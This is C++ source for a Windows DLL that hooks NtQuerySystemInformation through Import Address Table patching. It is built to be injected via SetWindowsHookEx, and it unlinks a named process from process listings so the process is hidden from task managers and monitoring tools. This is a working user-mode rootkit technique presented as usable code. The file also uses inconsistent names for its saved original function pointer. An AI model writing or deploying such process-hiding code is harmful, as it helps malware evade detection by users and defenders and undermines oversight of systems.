// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#define DLL_EXPORT
#include "dllmain.h"

extern "C"
{
    DWORD_PTR g_originalFuncAddr;

    int hook(PCSTR funcToHook, PCSTR dllToHook, DWORD_PTR newFuncAddr)
    {
        PIMAGE_DOS_HEADER dosHeader;
	    PIMAGE_NT_HEADERS NTHeader;
	    PIMAGE_OPTIONAL_HEADER optionalHeader;
	    IMAGE_DATA_DIRECTORY importDirectory;
	    PIMAGE_IMPORT_DESCRIPTOR importDescriptor;

	    DWORD_PTR baseAddress = (DWORD_PTR)GetModuleHandle(NULL);

	    dosHeader = (PIMAGE_DOS_HEADER)(baseAddress);
	    NTHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
	    optionalHeader = &NTHeader->OptionalHeader;
	    importDirectory = optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + importDirectory.VirtualAddress);

	    int index = 0;
	    char *dllName;
	    // Look for the DLL which includes the function for hooking
	    while (importDescriptor[index].Characteristics != 0)
	    {
		    dllName = (char *)(baseAddress + importDescriptor[index].Name);
		    if (!strcmp(dllToHook, dllName))
			    break;
		    index++;
	    }

	    // exit if the DLL is not found in import directory
	    if (importDescriptor[index].Characteristics == 0)
	    {
		    return 0;
	    }

	    // Search for requested function in the DLL
	    PIMAGE_THUNK_DATA thunkILT; // Import Lookup Table - names
	    PIMAGE_THUNK_DATA thunkIAT; // Import Address Table - addresses
	    PIMAGE_IMPORT_BY_NAME nameData;

	    thunkILT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].OriginalFirstThunk);
	    thunkIAT = (PIMAGE_THUNK_DATA)(baseAddress + importDescriptor[index].FirstThunk);
	    if (thunkIAT == NULL || thunkILT == NULL)
	    {
		    return 0;
	    }
	
	    while ((thunkILT->u1.AddressOfData != 0) & (!(thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG)))
	    {
		    nameData = (PIMAGE_IMPORT_BY_NAME)(baseAddress + thunkILT->u1.AddressOfData);
		    if (!strcmp(funcToHook, (char *)nameData->Name))
			    break;
		    thunkIAT++;
		    thunkILT++;
	    }


	    // Hook IAT: Write over function pointer
	    DWORD dwOld = NULL;
        g_originalFuncAddr = thunkIAT->u1.Function;
	    VirtualProtect((LPVOID)&(thunkIAT->u1.Function), sizeof(DWORD_PTR), PAGE_READWRITE, &dwOld);
	    thunkIAT->u1.Function = newFuncAddr;
	    VirtualProtect((LPVOID)&(thunkIAT->u1.Function), sizeof(DWORD_PTR), dwOld, NULL);

	    return 1;
    }
    

    DECLDIR NTSTATUS WINAPI HookedNtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID                    SystemInformation,
        ULONG                    SystemInformationLength,
        PULONG                   ReturnLength
    )
    {
        NTSTATUS status = ((_NtQuerySystemInformation)g_original_func_addr)(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength);
        PSYSTEM_PROCESS_INFORMATION previous, current;

        if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status)) 
        {
            previous = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
            current = (PSYSTEM_PROCESS_INFORMATION)((unsigned char*)previous + previous->NextEntryOffset);

            while (previous->NextEntryOffset) 
            {
                //if ((DWORD)(current->UniqueProcessId) == g_hidden_pid)
                if (!wcscmp(HIDDEN_PROCESS_IMAGE, current->ImageName.Buffer)) 
                {
                    // remove current from the linked list
                    if (current->NextEntryOffset) 
                    {
                        previous->NextEntryOffset += current->NextEntryOffset;
                    } 
                    else 
                    {
                        previous->NextEntryOffset = 0;
                    }
                }
                previous = current;
                current = (PSYSTEM_PROCESS_INFORMATION)((unsigned char*)previous + previous->NextEntryOffset);
            }
        }
        return status;
    }


    // This function is called if the dll is injected using SetWindowsHookEx
    // and idHook is WH_CALLWNDPROC.
    // It just calls the next hook procedure in the hook chain.
    DECLDIR LRESULT CALLBACK CallWndProc(
        _In_ int    nCode,
        _In_ WPARAM wParam,
        _In_ LPARAM lParam
    )
    {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    PCSTR funcToHook = "NtQuerySystemInformation";
    PCSTR dllToHook = "ntdll.dll";

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // A process is loading the DLL.
        hook(funcToHook, dllToHook, (DWORD_PTR)&HookedNtQuerySystemInformation);
        break;
    case DLL_THREAD_ATTACH:
        // A process is creating a new thread.
        break;
    case DLL_THREAD_DETACH:
        // A thread exits normally.
        break;
    case DLL_PROCESS_DETACH:
        // A process unloads the DLL.
        // restore the original function address in the IAT 
        hook(funcToHook, dllToHook, g_originalFuncAddr);
        break;
    }
    return TRUE;
}
